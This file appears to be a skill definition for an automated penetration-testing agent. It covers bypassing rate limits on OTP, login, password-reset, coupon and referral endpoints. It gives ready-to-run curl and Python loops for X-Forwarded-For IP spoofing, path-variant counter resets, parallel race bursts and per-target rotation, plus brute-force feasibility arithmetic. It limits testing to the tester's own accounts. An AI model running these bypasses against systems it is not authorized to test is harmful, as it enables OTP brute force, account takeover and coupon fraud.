---
name: rate_limit_bypass
agent: agent8_logic
description: Map business rate limits and defeat them — header/IP rotation, endpoint variants, race windows — proving brute-force feasibility with math.
---

# Rate Limit Bypass

## Purpose
Rate limits are the only thing standing between an attacker and OTP brute force, credential stuffing, coupon guessing, and referral farming. This skill maps exactly which business-critical endpoints are limited, measures the real enforcement (429s, windows, counters), then systematically defeats it via identity rotation (headers, IPs), endpoint variants, and timing windows. The deliverable is not "limit bypassed" — it is the *feasibility math*: keyspace ÷ attempts-per-second ÷ window = cracked or not.

## Division of labor
- **Consumes:** endpoint lists highlighting auth, OTP, coupon-validation, referral, password-reset, and login surfaces (`<host>_endpoints.txt` from `hidden_endpoint_discovery`); code-structure notes from `coupon_referral_abuse` when guessing is in scope
- **Produces:** the finished artifact — `findings/rate_limit_bypass_confirmed.md` containing raw request/response pairs, the limit-enforcement map, bypass proofs, and feasibility math

## When to use / when NOT to use
- **Use when:** the target has OTP/2FA verification, login, password reset, coupon validation, referral-code redemption, SMS/email resend, or any "try a secret value" endpoint
- **Skip when (time-pass filter):** the endpoint has no secret to guess and no cost to spam (a rate-limited static page is time-pass). Ask: does bypassing this limit unlock something sensitive — account takeover, money, data? Bypassing a limit on a newsletter signup is not a finding. Never run full brute force against real secrets — prove feasibility with math on your own test accounts, then stop.

## Methodology
1. Inventory candidate endpoints: login, OTP verify, password reset token check, coupon apply, referral redeem, SMS resend, email verification, "check username/email availability". Record method, parameters, and the success/failure signal for each.
2. Establish the baseline limit: from a single IP with a fixed identity, send requests at a steady rate and record when 429s (or throttling signals: increased latency, CAPTCHA, temporary block) begin. Note the exact response: status code, `Retry-After` header, `X-RateLimit-*` headers, and the error body — these reveal the limiter's design.
3. Measure the window: after hitting the limit, probe at intervals (30s, 1m, 5m, 15m) to find when the counter resets. A sliding window vs fixed window changes the optimal attack shape — document which it is.
4. Determine the counter key: is the limit per-IP, per-account, per-target-identifier (e.g. per phone number), or global? Test by rotating one dimension at a time: same account from a new IP, new account from the same IP, same IP against a different target username. The dimension that resets the counter is the bypass surface.
5. Test header-based IP spoofing: replay the throttled request with `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Remote-IP`, `Forwarded: for=`, each set to a fresh random IP. If any header resets the counter, the limiter trusts client input — capture the before/after pair.
6. Test endpoint variants: trailing slash (`/verify` vs `/verify/`), case (`/Verify`), version prefix (`/v1/verify` vs `/v2/verify`), `.json` suffix, trailing `/.`, semicolon params (`/verify;.json`), and alternate but equivalent endpoints (does `/api/otp/verify` and `/api/v2/auth/otp` share a counter?). Each variant that gets a fresh counter is a multiplier.
7. Test encoding/null-byte variants: `%00`, `%2e`, double-encoding on the path — only where the backend normalizes them to the same handler. A variant that reaches the same logic with a fresh counter counts.
8. Test parameter-level vs endpoint-level limits: if the limit is per-account (e.g. 5 OTP attempts per phone number), rotate the *target* — attack many accounts each under their own cap. Document the aggregate throughput this enables.
9. Test the race window: fire a burst of N requests inside the window (e.g. 50 requests in the 60s window that allows 5). Count how many were *processed* (200s with real verification logic) vs rejected. Some limiters count asynchronously — the burst that lands before the counter syncs is free attempts.
10. Test distributed rotation practically: rotate through a small pool of source IPs you control (or header-spoofed identities if step 5 worked) and measure sustained attempts/sec over 5 minutes. This is the real number for the feasibility math — not the theoretical one.
11. Do the feasibility math: keyspace (OTP 6-digit = 1,000,000; 4-digit = 10,000; coupon charset^length) ÷ measured sustained attempts/sec = expected time to 50% success. Show the arithmetic explicitly. A 6-digit OTP at 100 attempts/sec with no lockout = ~83 minutes expected — that is a critical finding.
12. Check for missing limits entirely: some endpoints (password-reset token *validation*, coupon *check*, username enumeration) have no limiter at all — no 429 at 500+ requests is itself the finding. Document the request count tested.
13. Check lockout vs throttle: does the endpoint ever *lock* the account or invalidate the secret after N failures? A throttle without lockout + OTP that doesn't expire = infinite guessing given time. Note OTP/code expiry — a 10-minute OTP with a bypassed limit is far more exploitable than a 30-second one.
14. Test reset-trigger abuse: does requesting a *new* OTP/code reset the attempt counter on the old one? If yes, the attacker gets infinite fresh windows — chain: guess N times, request resend, guess N more.
15. Re-verify the bypass twice: clean state, re-establish the limit, re-apply the bypass, and confirm the counter resets. One lucky 200 is noise; a repeatable fresh counter is a finding.

### Decision branches — what the response tells you to do next
- **X-Forwarded-For resets the counter:** the limiter trusts client input. Measure sustained attempts/sec over 5 minutes with rotating spoofed IPs — that number goes straight into the feasibility math.
- **No 429 after 500+ requests:** the endpoint has no limiter. Document the exact request count tested and move to feasibility math; a missing limit is a finding, not an invitation to brute force real secrets.
- **Limit is per-target (per phone/user), not per-IP:** rotate the target, not your IP. Aggregate throughput across many targets is the real attack — compute attempts/sec × number of targets.
- **Resend/new-code resets the attempt counter:** you have infinite fresh windows. Chain: guess N times, request resend, guess N more — document the loop with raw pairs.
- **CAPTCHA appears instead of 429:** note it as a mitigation, then test whether the underlying API path (mobile app endpoint, /v2 variant) skips the CAPTCHA. A CAPTCHA on web but not on API is a bypass.
- **429s but with `Retry-After: 1`:** the window is tiny — burst inside it (step 9). A 1-second window with async counting is often fully exploitable via parallelism.
- **Inconsistent throttling across runs:** mark INCONCLUSIVE. Limiter behavior that changes run to run (CDN vs origin, anycast routing) needs a second model run before any claim.

## Exact commands
Baseline — establish the limit (single identity, steady rate):
```bash
for i in $(seq 1 30); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST 'https://<HOST>/api/v1/otp/verify' \
    -H 'Content-Type: application/json' \
    --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}')
  echo "attempt $i -> $code"
  sleep 2
done
```
Inspect limiter headers on a throttled response:
```bash
curl -s -i -X POST 'https://<HOST>/api/v1/otp/verify' \
  -H 'Content-Type: application/json' \
  --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}' | head -30
# look for: 429, Retry-After, X-RateLimit-*, error body describing the window
```
Header-spoof bypass test (fresh random IP per request):
```bash
for i in 1 2 3 4 5; do
  IP="203.0.113.$((RANDOM % 250 + 1))"
  curl -s -o /dev/null -w "XFF=$IP -> %{http_code}\n" -X POST 'https://<HOST>/api/v1/otp/verify' \
    -H 'Content-Type: application/json' -H "X-Forwarded-For: $IP" \
    --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}'
done
# also try: X-Real-IP, X-Originating-IP, X-Remote-IP, Forwarded: for=<IP>
```
Endpoint-variant counter test:
```bash
for p in "/api/v1/otp/verify" "/api/v1/otp/verify/" "/API/V1/OTP/VERIFY" "/api/v2/otp/verify" "/api/v1/otp/verify.json"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://<HOST>$p" \
    -H 'Content-Type: application/json' \
    --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}')
  echo "$p -> $code"
done
```
Race-window burst (N parallel inside the window):
```bash
seq 1 50 | xargs -P 50 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST 'https://<HOST>/api/v1/otp/verify' \
  -H 'Content-Type: application/json' \
  --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}' | sort | uniq -c
# count real 200/400-verification responses vs 429s: processed attempts = free guesses
```
Sustained-throughput measurement (5 minutes, rotating spoofed IPs):
```bash
python3 - <<'EOF'
import subprocess, time, random
url = "https://<HOST>/api/v1/otp/verify"
data = '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}'
ok = 0; start = time.time()
while time.time() - start < 300:
    ip = f"203.0.113.{random.randint(1,254)}"
    r = subprocess.run(["curl","-s","-o","/dev/null","-w","%{http_code}","-X","POST",url,
        "-H","Content-Type: application/json","-H",f"X-Forwarded-For: {ip}","--data",data],
        capture_output=True, text=True)
    if r.stdout.strip() != "429": ok += 1
print(f"processed attempts in 300s: {ok} -> {ok/300:.1f}/sec")
EOF
```
Feasibility math template (paste into the artifact):
```bash
python3 - <<'EOF'
keyspace = 10**6          # 6-digit OTP
rate = 100                # measured sustained attempts/sec
expected_seconds = (keyspace / 2) / rate
print(f"expected 50%-success time: {expected_seconds/60:.1f} minutes")
EOF
```

# CAPTCHA-vs-API check: does the mobile/v2 path skip the web CAPTCHA?
curl -s -o /dev/null -w "web: %{http_code}\n" -X POST 'https://<HOST>/api/v1/otp/verify' \
  -H 'Content-Type: application/json' --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}'
curl -s -o /dev/null -w "v2: %{http_code}\n" -X POST 'https://<HOST>/api/v2/otp/verify' \
  -H 'Content-Type: application/json' --data '{"phone":"<OWN_TEST_NUMBER>","code":"000000"}'
# Per-target rotation: same IP, several target accounts — aggregate sub-cap throughput
for u in user1 user2 user3 user4 user5; do
  curl -s -o /dev/null -w "$u -> %{http_code}\n" -X POST 'https://<HOST>/api/v1/otp/verify' \
    -H 'Content-Type: application/json' --data "{\"phone\":\"<OWN_PREFIX>$u\",\"code\":\"000000\"}"
done

## Completion-bias defenses
- [ ] Candidate endpoints inventoried (login, OTP, reset, coupon, referral, resend) with success/failure signals
- [ ] Baseline limit established: exact 429 behavior, headers, and window measured
- [ ] Counter key determined (per-IP / per-account / per-target / global)
- [ ] Header-spoof bypass tested (X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Remote-IP, Forwarded)
- [ ] Endpoint variants tested (slash, case, version, .json, alternate paths)
- [ ] Parameter-level vs endpoint-level limits distinguished
- [ ] Race window bursted and processed-vs-rejected attempts counted
- [ ] Sustained throughput measured over 5 minutes (the real attempts/sec number)
- [ ] Feasibility math computed and shown (keyspace ÷ rate = expected crack time)
- [ ] Missing limits documented (request count tested with no 429)
- [ ] Lockout behavior and secret expiry checked
- [ ] Resend-resets-counter chain tested
- [ ] Bypass reproduced 2x from clean state
- [ ] `findings/rate_limit_bypass_confirmed.md` exists on disk with raw pairs and math
- [ ] Decision branches followed — pivoted on what the responses actually showed, not the original plan
- [ ] Attempts/sec is measured output, not an assumed number, with the measurement command saved
- **Review step:** agent10_review must verify: (a) the finished artifact exists with raw pairs; (b) the attempts/sec figure is *measured*, not assumed, with the measurement command and output in the artifact; (c) the feasibility math is shown step by step; (d) all guessing was against the tester's own accounts — no real user secrets were attacked; (e) a "bypass" that only worked once is marked INCONCLUSIVE, not CONFIRMED.
- **Nudge prompts:** "Keep going until you have tested every bypass dimension — headers, variants, windows — not just the first 429 you saw." / "Do not report done before findings/rate_limit_bypass_confirmed.md exists on disk with the feasibility math." / "A bypass without measured attempts/sec is a hypothesis, not a finding — measure it."
- **Finished artifact definition:** `findings/rate_limit_bypass_confirmed.md` with the limit-enforcement map (endpoint → limit → window → counter key), raw request/response pairs for the baseline and each bypass, the measured throughput, the feasibility math, and a verdict (CONFIRMED / INCONCLUSIVE / NEGATIVE) per endpoint.

## Evidence standard
- Baseline: the throttled state (429s or equivalent) captured from a single identity — every bypass is compared against this exact baseline pair
- Reproduction: 2x independent reproduction required — re-establish the limit from clean state, re-apply the bypass, confirm the fresh counter both times
- Raw evidence: full request/response pairs saved, including limiter headers (`Retry-After`, `X-RateLimit-*`) and the throughput-measurement output
- Verdicts: CONFIRMED (bypass repeatable twice, throughput measured, math shows feasible secret recovery) / INCONCLUSIVE (inconsistent throttling or unmeasured throughput — needs a second model run or human) / NEGATIVE (limit held across all dimensions — documented with the baseline pair so nobody re-tests it)

### Worked verdict example
- CONFIRMED: baseline throttled at 5 attempts/min (429 + `Retry-After: 60`); with rotating `X-Forwarded-For` IPs, 480 verification attempts were processed in 300s (1.6/sec) with zero 429s, twice. 6-digit OTP keyspace ÷ 1.6/sec ≈ 87h expected — feasible for a targeted attack; bypass CONFIRMED with math.
- INCONCLUSIVE: header spoofing worked once but failed on repeat — possibly anycast routing to different limiter nodes; needs a second run.
- NEGATIVE: 429s persisted across all header, variant, and window tests; sustained rate capped at 5/min measured — limit held; pair saved.

## Handoffs
- `agent10_review` consumes `findings/rate_limit_bypass_confirmed.md` and verifies every CONFIRMED verdict against the evidence standard before the report ships.
- `coupon_referral_abuse` consumes the coupon-validation endpoint's bypass result: a guessable code space *plus* a bypassed limit = practical coupon brute force.
- `invite_onboarding_abuse` consumes the invite-token endpoint's limit status: predictable invite tokens with no rate limit = invite enumeration.
- The final report writer needs: the feasibility math per endpoint (keyspace, measured rate, expected crack time), the exact bypass technique, and what the bypassed limit protects (OTP → account takeover; coupon → money; login → credential stuffing).
- `finding_validator` consumes the throughput-measurement output to independently verify the attempts/sec claim before any brute-force feasibility verdict ships.
